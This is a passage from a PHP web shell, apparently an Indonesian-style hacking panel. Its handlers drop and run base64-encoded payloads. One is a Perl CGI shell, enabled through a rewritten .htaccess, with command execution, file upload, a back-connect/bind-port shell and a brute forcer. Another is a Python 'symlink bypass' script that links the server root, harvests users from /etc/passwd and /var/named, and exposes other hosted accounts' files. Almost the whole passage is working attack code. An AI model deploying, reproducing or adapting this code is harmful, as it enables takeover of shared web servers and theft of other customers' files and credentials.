wcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoNCglwcmludCAmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0DQp7DQoJJlByaW50UGFnZUhlYWRlcigiY2xpZW50cG9ydCIpOw0KCXByaW50ICZCYWNrQmluZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.Unknown1337' target='_blank'>Klik Here</a>";
}elseif($_GET['do'] == 'symlink_python') {
	$sym_dir = mkdir('ia_sympy', 0755);
        chdir('ia_sympy');
	$file_sym = "sym.py";
	$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
        $sym = fopen($file_sym, "w");
	fwrite($sym, base64_decode($sym_script));
	chmod($file_sym, 0755);
        $jancok = exe("python sym.py");
	echo "<br><center>Done ... <a href='ia_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
} 

elseif($_GET['do'] == 'cgi2') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi2.Unknown1337";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Unknown1337 \n AddHandler cgi-script .Unknown1337 \n AddHandler cgi-script .con7ext";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgQ29uN2V4dA0KIyBUaGFua3MgVG8gOiAweDE5OTkgLSBYYWkgU3luZGljYXRlIFRlYW0gLSBBbmQgWW91DQogDQokV2luTlQgPSAwOw0KJE5UQ21kU2VwID0gIiYiOw0KJFVuaXhDbWRTZXAgPSAiOyI7DQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOw0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0Kc3ViIFJlYWRQYXJzZQ0Kew0KICAgIGxvY2FsICgqaW4pID0gQF8gaWYgQF87DQogICAgbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCiAgIA0KICAgICRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KIA0KICAgIGlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQogICAgew0KICAgICAgICAkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCiAgICB9DQogICAgZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQogICAgew0KICAgICAgICBiaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQogICAgICAgIHJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQogICAgfQ0KIA0KICAgICMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCiAgICBpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCiAgICB7DQogICAgICAgICRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcNCiAgICAgICAgQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsNCiAgICAgICAgJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiAgICAgICAgJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KICAgICAgICAkSGVhZGVyID0gJGA7DQogICAgICAgICRCb2R5ID0gJCc7DQogICAgICAgICRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCiAgICAgICAgJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQogICAgICAgICRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsNCiAgICAgICAgJGlueydmJ30gPSAkMTsNCiAgICAgICAgJGlueydmJ30gPX4gcy9cIi8vZzsNCiAgICAgICAgJGlueydmJ30gPX4gcy9ccy8vZzsNCiANCiAgICAgICAgIyBwYXJzZSB0cmFpbGVyDQogICAgICAgIGZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgICRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KICAgICAgICAgICAgJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KICAgICAgICAgICAgJGtleSA9ICQxOw0KICAgICAgICAgICAgJHZhbCA9ICQnOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KICAgIHsNCiAgICAgICAgQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KICAgICAgICBmb3JlYWNoICRpICgwIC4uICQjaW4pDQogICAgICAgIHsNCiAgICAgICAgICAgICRpblskaV0gPX4gcy9cKy8gL2c7DQogICAgICAgICAgICAoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KICAgICAgICAgICAgJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KfQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+Q29uN2V4dDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCjxzdHlsZT4NCkBmb250LWZhY2Ugew0KICAgIGZvbnQtZmFtaWx5OiAndWJ1bnR1X21vbm9yZWd1bGFyJzsNCnNyYzogdXJsKGRhdGE6YXBwbGljYXRpb24veC1mb250LXdvZmY7Y2hhcnNldD11dGYtODtiYXNlNjQsZDA5R1JnQUJBQUFBQUdXSUFCTUFBQUFBdkRBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJHUmxSTkFBQUJxQUFBQUJ3QUFBQWNaTytIZEVkRVJVWUFBQUhFQUFBQUtRQUFBQ3dDSXdFSlIxQlBVd0FBQWZBQUFBQXlBQUFBUURYT1RyQkhVMVZDQUFBQ0pBQUFBVmtBQUFJR2xOdkpxRTlUTHpJQUFBT0FBQUFBWFFBQUFHQ1pWUVRaWTIxaGNBQUFBK0FBQUFHT0FBQUI2Z0NMakJaamRuUWdBQUFGY0FBQUFFb0FBQUJLRTBrT2MyWndaMjBBQUFXOEFBQUJzUUFBQW1WVHRDK25aMkZ6Y0FBQUIzQUFBQUFJQUFBQUNBQUFBQkJuYkhsbUFBQUhlQUFBVm1FQUFLVzBJcnQyUEdobFlXUUFBRjNjQUFBQU1BQUFBRFlBeTJMRGFHaGxZUUFBWGd3QUFBQWNBQUFBSkFxbUJQOW9iWFI0QUFCZUtBQUFBV2dBQUFPaWhtRnhDR3h2WTJFQUFGK1FBQUFCeUFBQUFkUU9VVGFRYldGNGNBQUFZVmdBQUFBZ0FBQUFJQUlHQWhWdVlXMWxBQUJoZUFBQUFYc0FBQVBPWWxlS3JYQnZjM1FBQUdMMEFBQUI0Z0FBQXRRc0JxVU1jSEpsY0FBQVpOZ0FBQUNuQUFBQkJxUVR2RzUzWldKbUFBQmxnQUFBQUFZQUFBQUdkVnRTcGdBQUFBRUFBQUFBekQyaXp3QUFBQURKNWI3TEFBQUFBTTdNSmRsNDJtTmdaR0JnNEFOaUZRWVFZR0pnQnVJNkJrYUdlb1pHSUt1SjRRV1F6UUtXWVFBQU5tSURMUUFBQUhqYVkyQmtZR0RnWXJCaHNHTmdUcTRzeW1FUVNTOUt6V2FReTBrc3lXUFFZR0FCeWpMOC93OGtzTEdBQUFCM2t3djdBQUI0Mm5XUngwcERRUmlGditzMUxrSndGUXZpSW9nbDloaGpMOFFTQkdNTVhGMjVFR0tNTGt3aTNCaEJpU3Q3N3cwN1BvVzRzN3lJTDZKL2hvdmdRb1k1ZjVselpzN01vQUYySHZsQ2p5NlpjWnl6Wm15TzluaGtJY2t3aGVqOVE0YUx3bEJ3VUhETTZCZUU3Mjl5UmFlUkl6R2IvZTJVWWV1YkNMandEaGpqZ3FId2lBdS9FUTRKamh0QjZTaSt6ZUxyV2VVZmZiYlNwY3JtdHNpTUdjVVZqYVJpdUpQcGhFbkR2RG1keEpkS2VieDBLbGFPWW12V0RpalVmbGRzT0hCU1NqbDFxcXZodG1LckZmM2txVGhxMVZPaWM0Z3lRNXBGcVhVSzVOWkYwclhMVExDaWZBWVkrNGVuUzE0c005L3lvcXYxak9WcFdWeFhVRW1WK0tpbWhscnhWVThEalhob2tyZHB4a2VMZUd1am5RN2hkdEZORDcyc3NzWTZHMnl5eFRZNzdMTEhQZ2NjY3NReEo1eHl4amtYWEhMRk5UZmNjc2M5RC9LM1QzenlybDR6d0tSNGVPYUZFbDU1ay9NK1pIVDhBR25WU3FFQUFBQjQybU5nWm43Qk9JR0JsWUdGZFJhck1RTURvenlFWnI3SWtNYkV3TURBeE0zS3ljekd4TXpFOG9DQjZYOEFnMEkwQXhTNE9QbzZNamd3OFA1bVlrdjdsOGJBd0xhRXFVK0JnV0YrR0NOUTl6YVdMMEFsQ2d4TUFMMzZENzRBQUFCNDJtTmdZR0JtZ0dBWkJrWUdFSGdDNURHQytTd01KNEMwSG9NQ2tNVUhaUEV5eURMVU1meG5ER2FzWURyR2RFZUJTMEZFUVVwQlRrRkpRVTFCWDhGS0lWNWhqYUtTNnAvZlRQLy9nMDBDcVZkZ1dNQVlCRlhQb0NDZ0lLRWdBMVZ2Q1ZmUENGVFAvUC9yLzJmL24vdy8vTC93dis4L2hyK3ZINXg0Y1BqQmdRZjdIK3g1c1BQQnhnY3JIclE4c0xoLytOWXIxbWRRZDVJQUdOa2dYZ1N6bVlBRUU1b0NvQ1FMS3hzN0J5Y1hOdzh2SDcrQW9KQ3dpS2lZdUlTa2xMU01ySnk4Z3FLU3NvcXFtcnFHcHBhMmpxNmV2b0doa2JHSnFabTVoYVdWdFkydG5iMkRvNU96aTZ1YnU0ZW5sN2VQcjU5L1FHQlFjRWhvV0hoRVpGUjBUR3hjZkVKaUVrTjdSMWZQbEpuemx5eGV1bnpaaWxWclZxOWR0Mkg5eGsxYnRtM2R2blBIM2ozNzlqTVVwNlpsM2F0Y1ZKanp0RHlib1hNMlF3a0RRMFlGMkhXNXRRd3JkemVsNUlQWWVYWDNrNXZiWmh3K2N1MzY3VHMzYnU1aU9IU1U0Y25EUjg5Zk1GVGR1c3ZRMnR2UzF6MWg0cVQrYWRNWnBzNmRONGZoMlBFaW9LWnFJQVlBSm9hTXhBQUFBQUFEdGdUMEFKQUFod0NKQUlzQWxnRElBUklBcUFFR0FKa0Fvd0NvQUt3QXNBQzJBSlVBb1FDY0FLNEFkUUN5QUhrQWZBQ1RBS29BalFDZkFLWUFkd0J0QUhBQWZ3QkVCUkVBQUhqYVhWRzdUbHRCRU4wTkR3T0J4TmdnT2RvVXM1bVF4bnVoQlFuRTFZMWlaRHVGNVFocE4zS1JpM0VCSDBDQlJBM2FyeG1nb2FSSW13WWhGMGg4UWo0aEVqTnJpS0kwT3p1emM4NlpNMHZLa2FwMzZXdlBVK2Nra01MZEJzMDIvVTVJdGJNQTk2VHI2NDJNdElNSFdteG05TXAxKy80TEJwdlJsRHRxQU9VOWJ5a1BHVTA3Z1ZxMHAvN1IvQXFHKy93Zjh6c1l0RFRUOU5RNkNla2hCT2FiY1V1RDd4bk51c3NQK29MVjRXSXdNS1NZcHVJdVA2WlMvcmMwNTJyTHNMV1IwYnlETXhINXlUUkFVMnR0QkpyKzFDSFY4M0VVUzVETHByRTJtSml5L2lRVHdZWEpkRlZUdGN6NDJzRmRzclBvWUlNcXpZRUgyTU5XZVF3ZURnOG1GTkszSk1vc0RSSDJZcXZFQ0JHVEhBbzU1ZHpKL3FSQStVZ1N4cnhKU2p2amhyVUd4cEhYd0tBMlQ3UC9QSnROYlc4ZHd2aFpITUYzdnhsTE92aklodG9ZRVdJN1lpbUFDVVJDUmxYNWhoclB2U3dHNUZMN3owQ1VnT1h4ajMrZENMVHUyRVE4bDdWMURqRldDSHArMjl6eXk0cTdWcm5PaTBKM2I2cHFxTklwemZ0ZXpyN0hBNTRlQzhOQlk4R2J6L3YrU29INlBDeXVOR2dPQkVONk4zci9vclhxaUt1OEZ6NnlKOU8vc1ZvQUFBQUFBUUFCLy84QUQzamE3TDBOZkJ2bGxUYzZ6NHkrTE90alJwK1daRm1XRlZsUkZIa2lLWXFpT0k0ZHh4akhHTmQxWGE5cmpBa2g1QXZTWUl4Smc1djE5V2JUTkEzQkNRR2FwaWxOYVpiTjV1Yk56c2dpVUpmU1VMYVhzaXpMOW5JYmZsemVicmZiYlZsM2FaZFN5dktSaVBlY1owYitpTzJRN2JidmUrL3Y5NVphSHpQS3pIbk9jNTV6L3Vmak9jT3dUQlBEc0p1MG4yWTRScy9VeUlRUlYrZjBtdEN2a3JKTys5OVg1emdXUGpJeWg0ZTFlRGluMXkyNnREcEg4SGhLQ0FyaG9CQnNZaXNMaThpeHdsYnRwei80UDVzMEx6RndTVEw0MFJ2c1BzMDdUQ25qWVZxWVhBbkR4R1N1WkRKblpwa1lrYnlpeEZ5VWRhV1QrRGR1MVRHR21Hd1NKaVdUS0Z1RlNkbEhZckxWSk5qa0VpNmJaV1F6Sjlna1IzWlpJcng4UlNycGNqcDBvYXBxdTVBU0hCWldINnJoeUdCbkp0dlJrYzEwaXVjMVJyUHVIcDNacUJtc2IydXJyNyt4amR0R2VncW4yMFlHNzFwVE56QTRnclFadUFIMlBlMU9wb1N4TXpXTXBCY2xQcFVuSll4QkU1TktrMFJ5VU9vNDA2VEU4YklSYURHYkptVW5pVEhMRWlTZGd0dkRUVWw0NmhNeFBPcmt1eTFPMHZtbzA5TE5PN1dPbTI3dWZXUERoamY2MUhlNEo1TmhHTzRGNEllUENaQ2JtWndYK0pGenVqeXBWQ3FuQjVia0RLVW0rSnhuaUZkdmpvMnpRcmwva1RzbE05ckpjWWU3ekxmSW5jeHJOZlFVeDFjRThKUldNem11S3pHYTRSU1JLa1hKZTFIMkFNVWVYbllCeFU3VEpGemVHQnR2Y05wTFlwSWxPVzV3dW9ESmV2aUpYcFFOY0ZwdndOTjZCazVya3BLVGwwdmgzNWxncEVFU2sxWjRKOWI4Nnp1MWpETm1uRmp6M2p0SDhJUGs1Y2Racjk0T05OQlhIYjdDRGNkTFBBYjQ0T0xIamE1UytPRGt4ODFPRS95QXA2OENmWFhnSy83R1RYOEQvNnFNL2l1NHBxOTRuZkxpZGZ6NG0vR0s0aThEZUp4cjRGa09COHdMeUpGeWYwV2c1b3IvU1ExZW1DSjdPbVVQd1YrS28zL09FUDBMMmZFdkE2Y3lqOWE5L2w3RFYrcC9WbmU4YnUrajlUK21uK0h2aVovVy81UzBIeUROKzBsSFFjSy8vWVdKQTRVY2FjYy9PQTV5VFppZEgyVzVvOXFEVEpvNXprZ3BVVnFXa2pYY1pDNmxRV2Fta3NETVNsRjJhV0Vpa2psWEpSNTB1VXRBNGxlSWt2MmlIT0lucFJBdko0SERycVNjZ01rb1Mwb0pYaTRCMXNkQjhEUHdIcktEdEpPc2xCUmtxeVdibFJLMm5LWnljUlkrbFFoU05DdkZiWEs1SDVlRkpnVS9aTEpTcFRCTzdQNzRJbmRXY3Rta2NsZ245YVNDcEpKcjJQVHlHalpTdzZXWHI4aUF0RllRdDc2R2hLcDBUa2NGNjY3Z1VIeWRvWFFOMlJuUGZIbXdkZE9xc2tUWDlsV1pIVjNwRTBlUGRSNklobUo3TiswY0NqWDJaSnIzYnF6OSt1UEhScisrL1FHZjZJN1ZobEl0bVpqRGtXeloxTHIzbE91Vmx6UVZ3aGdmNm15UFplTmhoNisyYzdCajkybkhtNy9RSklCbGpKWUpmL1J6N25XdEJYU0JGZVEvd3FTWU0wek9oQ3NnREMvNW1JWlpwSWxSelFBS0J3NTQ2SUY4SWhEbXpQQ21mTE9YMEc5MitvMUl5M0dONW5rYnc4T2k1YW5RNTNYS054MHZsOE8zeGNxM3hieGNBOStxNkRjNURReDI4WUl0VjJJRjFaS1ZheGJEWjNNNGtFV0dKbERsbEZmQllRL01nYXhqc3NCTCsweWRRMUtFYzdoU3lSWHA1ZFhBU0RMalhHYkc4ZkN1clZ0MzNidHQ2eTRMWnpoODZiMWdTaFFUQ1ZGTWtUMzN3RUU0T2JRSHYrSmg3b2NudnZHTkV5ZE9uYnIwb3VhZEQwM2NEL3QyN2VxRHYwdnZudmpHWTE4OThkaGpKOVFEb0tIclAzcUxlMEhMTXpGbUJkUEliR1Z5VmNBK0taTEtsUUxYNUFiTkpKSFdVZFcxMUFpNllTa3ExWXg1VWxyS3kzVXdiQjZXZGhPOFo1YUMySEJacVU3SWwwWlN5KzBvTjd4dDNPVmVsSUNQak54UUpkak9NenAra2JoOEZSeWdITWpVa1BUeU5Xd3FXY0dpMUxoQmxOYVFqTnRDOVBBcFZCMnhnRmpWc0JsSEJjR2Z3bGU3d3dXL1VMaFJmL3VkNmJXcDdydFdwemUzaS9kOW9UblVGdUU5dWtNbU1TUjJoM0toV09OalBlMzNkUzg3MDducjRLcW1JNDIxcXp2Q3F6ZDJkcVRTTjVQMGh1OTN0Unh0NzloMVE2U3lhV05ELy9OZE4wYTd4T3orVHR1dWI5L1FlTEM5WlczbjlhbmVYWjBkMjd5MW5YMlB0cWZ2Wi90cU43ZlgzVi9idXI0TDF5dDVuR3RqZTBEWG01a2dJNVdJcXBvbmtrWFI4ZndrL2JOT0szZlZwRHllMHhuTmhxMEdzMUdIK2p4K3o1N2Rvcmg3ejcyb0E5NG9uT0hjMmhNTUQvYURTQUs5a3NFOEtkdm9WZXpMYlJsM1NNZlNWYWF2WnQvNDVXUXYrOHdMNHEwUGI3bjV6VGZZY0lHOGZHYjRhT0ZQZnpiNDB0TlN6L0E1OHRMTWE5cm9OZTJpWkxrb2ErQ2FEdVdhR1plTldydElhb1VOVi9VYmNLblZRK2Z1dVlsNzVrWHh0b2Uxd2VGemhkUkh6TWk3UDN1eGEvZ29HZjJYd2IvN2pvVFhIV0laN2lEWW5hVk1OVmhoYW56am9tUzRLSmZDc0dGaHlLVUd3WmJYV3R5VlVaeDl2QlhPYmcycEk5UytyU0gxb0Rib1JBZUlQa0luMTBvaUdaaCsrRHlVc2JRY2FlUjlrbzl2SEd1eHBFMnRYMnZMN0lvYXhrcGoxd1dDMTRtbGg0enh3VXpiMTF1NG82ZDEvdXZDclNkdnRGcmJ2OTRhYWZMcVRtdmNaWWJVUUgzcFZsUGRnMDFOUjlZWU41dnJkNmFNN2pLa3U1L3A0VTV4cjRQTzZHUWtScFQwS1psd2s1STJtV01JYWxYR1dCTExFUVkvRWc0VnJFbVVqQmNsTmltWDJDYkJvT1ZLakhpdVJBOC9NNWJnUnlOWU90bXNzRE1kQlBRUWRBYUZrTkJQZWg0aXZZWEhIeUt2akpIZGhmMWpoWDFrbUtHeWt5aTh4cjVNL0RBaml4bVlrbnlwS2pzT1pHRGVVc3BZUUtNQUxwQXR3RU5KaTl6VHJ1SG9XbEgwQWt3WVNZUmI2aExXeHRxKzJyWjI4ZGF4alk4WmhJQVkxZlhFT3J0MnROZU9EblNZNkwwQzVDbjJwMndQclBJcUhLOU05SlA0UnlTTktET2d2N2hTeGdoMzA2cUNHblRDdi9nZWVlcmtTZmkzMndGckhTTkI0RlZhUVZwNXJvUXhnMHFkOFpreUNEU21qbEt0dnFuc21BbXJ5UGJPNXFiT3pxYm16cjMxdDl4U1gzZkxMWlFYektIQ09XNVFld3pvdTU3T0I1ZEMwdWdhc2xLY1JJQVBySEVTS1VUMHNQcXROKzlHMEtDUkdGNGlGK0FYRW51QmxRbEx6VFRCU1FCbGVvaGRmZWJ5RHdybmRMOTgz